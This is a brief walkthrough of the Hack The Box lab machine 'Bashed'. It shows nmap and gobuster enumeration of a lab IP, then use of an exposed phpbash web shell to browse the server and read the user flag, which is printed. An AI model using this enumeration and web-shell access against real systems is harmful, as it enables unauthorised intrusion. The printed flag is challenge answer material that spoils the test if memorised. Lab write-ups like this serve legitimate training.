# Bashed
```bash
nmap -sV -sC 10.129.213.165       
Nmap scan report for 10.129.213.165
Host is up (0.051s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```
```bash
gobuster dir -u http://10.129.213.165:80/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.213.165:80/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 317] [--> http://10.129.213.165/images/]                                       
/.php                 (Status: 403) [Size: 293]
/php                  (Status: 301) [Size: 314] [--> http://10.129.213.165/php/]                                          
/config.php           (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 318] [--> http://10.129.213.165/uploads/]                                      
/dev                  (Status: 301) [Size: 314] [--> http://10.129.213.165/dev/]                                          
/css                  (Status: 301) [Size: 314] [--> http://10.129.213.165/css/]                                          
/js                   (Status: 301) [Size: 313] [--> http://10.129.213.165/js/]                                           
Progress: 171436 / 283418 (60.49%)[ERROR] Get "http://10.129.213.165:80/site_tools.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 283416 / 283418 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
# Go to http://10.129.213.165/dev/ and open phpbash.php after that use that console to obtain user flag:
www-data@bashed:/var/www/html/dev# ls
phpbash.min.php
phpbash.php
www-data@bashed:/var/www/html/dev# cd ..
www-data@bashed:/var/www/html# cd ..
www-data@bashed:/var/www# cd ..
www-data@bashed:/var# cd ..
www-data@bashed:/# cd ..
www-data@bashed:/# cd ..
www-data@bashed:/# ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
scripts
srv
sys
tmp
usr
var
vmlinuz
www-data@bashed:/# cd home
www-data@bashed:/home# ls
arrexel
scriptmanager
www-data@bashed:/home# cd arrexel
www-data@bashed:/home/arrexel# ls
user.txt
www-data@bashed:/home/arrexel# cat user.txt
1eae4400781364611bcc305f53ef07c1
```

```bash

```


